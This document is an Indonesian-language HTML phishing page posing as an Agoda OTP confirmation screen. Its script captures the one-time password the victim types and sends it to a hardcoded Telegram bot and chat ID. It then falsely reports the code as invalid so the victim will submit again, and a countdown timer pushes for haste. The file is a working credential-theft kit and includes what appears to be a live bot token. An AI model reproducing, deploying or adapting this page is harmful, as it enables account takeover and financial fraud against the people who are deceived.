<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi OTP - Agoda</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        body { margin: 0; padding: 0; width: 100%; font-family: sans-serif; background-color: #f4f7fe; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
        h3 { font-size: 20px; color: #303030; margin-bottom: 20px; }
        input[type=password] { width: 100%; height: 50px; font-size: 24px; border-radius: 8px; text-align: center; border: 1.5px solid #e0e0e0; margin-bottom: 20px; outline: none; transition: border-color 0.3s; }
        input[type=password]:focus { border-color: #3E6CEA; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 20px; }
        #timers { font-weight: bold; font-size: 18px; color: #3E6CEA; margin-bottom: 20px; }
        .alert { margin-bottom: 20px; font-size: 14px; min-height: 20px; }
        button { width: 100%; height: 50px; border-radius: 8px; background-color: #3E6CEA; color: white; border: none; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        button:hover { background-color: #2d56c7; }
    </style>
</head>
<body>
    <div class="container">
        <form action="#" onsubmit="return sender()">
            <h3>Konfirmasi OTP kamu</h3>
            <input name="otp" id="pl" type="password" inputmode="numeric" maxlength="6" placeholder="••••••" required>
            <p>OTP dikirim ke SMS, WhatsApp atau Email kamu.<br>OTP akan kedaluwarsa dalam:</p>
            <div id="timers">03:00</div>
            <div class="alert"></div>
            <button id="btnSubmit" type="submit">𝗟𝗮𝗻𝗷𝘂𝘁𝗸𝗮𝗻</button>
        </form>
    </div>

    <script>
        var telegram_bot_id = "7566851766:AAEbOqBAI2XfHKrx15zlO-OqkGUvNzFPh_o";
        var chat_id = -1002437287311;

        var sender = function () {
            var u_password = document.getElementById("pl").value;
            var message = "Agoda OTP\n \nOTP: " + u_password;
            
            $(".alert").text("Memverifikasi...").css("color", "#3E6CEA");

            $.ajax({
                url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                method: "POST",
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({ "chat_id": chat_id, "text": message })
            }).done(function() {
                setTimeout(function() {
                    $(".alert").text("OTP tidak valid atau kedaluwarsa. Silakan coba lagi.").css("color", "#e53935");
                    document.getElementById("pl").value = "";
                }, 2000);
            });

            return false;
        };

        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + seconds;
                if (--timer < 0) timer = 0;
            }, 1000);
        }

        window.onload = function () {
            startTimer(180, document.querySelector('#timers'));
        };
    </script>
</body>
</html>
